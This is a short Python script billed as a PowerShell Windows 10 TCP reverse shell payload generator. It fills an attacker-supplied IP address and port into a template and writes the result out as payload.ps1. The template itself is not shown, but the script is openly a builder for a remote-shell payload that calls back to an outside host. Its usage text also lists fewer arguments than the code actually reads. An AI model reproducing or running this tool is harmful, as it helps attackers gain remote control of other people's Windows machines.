import sys

print()
print('[ ===== Powershell Windows 10 TCP Reverse Shell Payload Generator ===== ]')
print()
print('[ By: Leonard Haddad ]')
print()

# File contents
contents = ''

# Path passed as first argument from batchfile
cpath = sys.argv[1]
filename = cpath + '\payload.ps1'

# Template file path
template_path = sys.argv[2]

# Ip addr and port passed as 2nd and 3rd arguments
try:
    ip_addr = sys.argv[3]
    port = sys.argv[4]
except:
    print('[Usage]:\n')
    print('[BATCH]: shellgen.cmd ip_address port')
    print('[PYTHON]: shellgen.py path_to_template_file ip_address port\n')
    exit()
    
print('[Status]')
print('   Reading Template File...')
# Read template file
with open(template_path,'r') as f:
    contents += f.read()
    contents = contents.replace('IPADDRESS',ip_addr,1)
    contents = contents.replace('PORT',port,1)

print('   Generating Payload...')
# Generate payload file
with open(filename,'w+') as f:
    f.write(contents)
print('[Done]\n')

print('[ Payload Generated. File: %s ]\n' % filename)